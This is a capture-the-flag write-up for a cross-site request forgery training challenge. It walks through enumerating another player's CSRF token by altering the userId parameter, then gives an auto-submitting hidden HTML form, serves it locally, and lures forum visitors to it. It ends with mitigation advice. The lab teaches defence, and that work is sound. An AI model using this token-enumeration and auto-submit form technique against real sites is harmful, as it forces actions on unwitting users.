# Cross Site Request Forgery Challenge Seven

## Description
To complete this challenge, you need:
- Your ID: `d1ad0ecec51f6e1e7ea4ff97d9a106a3437a66f5`
- Another player's CSRF token
- A CSRF form attacking `POST /user/csrfchallengeseven/plusplus`

Once the victim visits your site hosting the CSRF exploit, it will increment your CSRF counter above 0.

The form should send a POST request to `POST /user/csrfchallengeseven/plusplus` which is vulnerable to CSRF with the following parameters:
- userId = `d1ad0ecec51f6e1e7ea4ff97d9a106a3437a66f5`
- csrfToken = `csrfTokenOfAnotherPlayer`

You've been reading that right. Along with your own ID, you'll need the CSRF token of another player. You can get your token using the `getYourToken` function.

## Solution
This challenge requires obtaining another user's CSRF token to craft a successful attack. We can exploit the `getYourToken` function to retrieve tokens from other users by manipulating the userId parameter.

## Steps to Reproduce

### 1 Step
Click the `getYourToken` button to initiate the request.

![](/writeups/assets/images/csrf/csrf-7-1.jpg)

Open your browser's developer tools and select "Edit and Resend" for the request.

![](/writeups/assets/images/csrf/csrf-7-2.jpg)

Replace the userId parameter with 40 underscores: "________________________________________" and modify the first character to test different user IDs. This technique allows you to discover other users' tokens.

![](/writeups/assets/images/csrf/csrf-7-3.jpg)

### 2 Step
After obtaining another user's CSRF token, update your HTML file as in previous tasks:

```html
<form name="malForm" action="https://localhost/user/csrfchallengeseven/plusplus" method="POST">
    <input type="hidden" name="userId" value="d1ad0ecec51f6e1e7ea4ff97d9a106a3437a66f5"/>
    <input type="hidden" name="csrfToken" value="-48693628476759974357279646890064616476"/>
    <input type="submit"/>
</form>
<script> document.malForm.submit(); </script>
```

### 3 Step
Serve your file using Python's built-in HTTP server:

```bash
python3 -m http.server 8080
```

Post your URL to the forum and wait for other users to visit.

## Exploit
When another user visits your page, the form will submit with their valid CSRF token and your userId, successfully incrementing your counter.

## Impact
This vulnerability demonstrates how improper input validation can allow attackers to enumerate user tokens and bypass CSRF protection mechanisms.

## Mitigation
To properly implement CSRF protection:
- Validate user inputs and prevent ID enumeration
- Generate unique, random CSRF tokens tied to specific user sessions
- Implement rate limiting to prevent brute force attacks
- Use the SameSite cookie attribute as an additional defense layer
- Consider implementing additional authentication for sensitive operations

---

[← Previous](./csrf-6.md) | [Next →](./csrf-json.md)

